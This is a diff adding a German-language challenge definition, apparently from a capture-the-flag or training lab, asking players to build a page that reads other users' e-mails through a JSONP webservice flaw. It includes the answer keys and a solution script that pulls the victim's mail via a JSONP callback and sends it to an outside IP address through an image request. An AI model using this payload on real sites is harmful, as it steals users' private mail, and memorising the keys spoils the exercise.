@@ -1,0 +1,18 @@
+---
+:description: |
+  Setze eine Webseite auf, welche die E-Mails von eingeloggten Nutzern liest. Benutze dazu die Schwachstelle im Webservices, welcher auch im Dashboard verwendet wird.
+  Die Homepage kann auf myhomepage aufgesetzt werden, es gibt neugierige User, die sich alle dort existierenden Homepages anschauen.
+  Die Lösung ist der Absender oder der Betreff einer Mail des neugierigen Users.
+:category: "Webservice"
+:name: "Read others mail"
+:value: 10
+:keys:
+  - "Fön"
+  - "Küss mich, ich bin ein verzauberter Königssohn!"
+:solution: |
+  <script>
+  function updateMail(mail_ary){
+    document.write("<img src='http://172.23.42.150:8080/"+JSON.stringify(mail_ary)+"' />");
+  }
+  </script>
+  <script type='text/javascript' src='http://mail.mgmsp-lab.com/mail.cgi?jsonp=updateMail'></script>
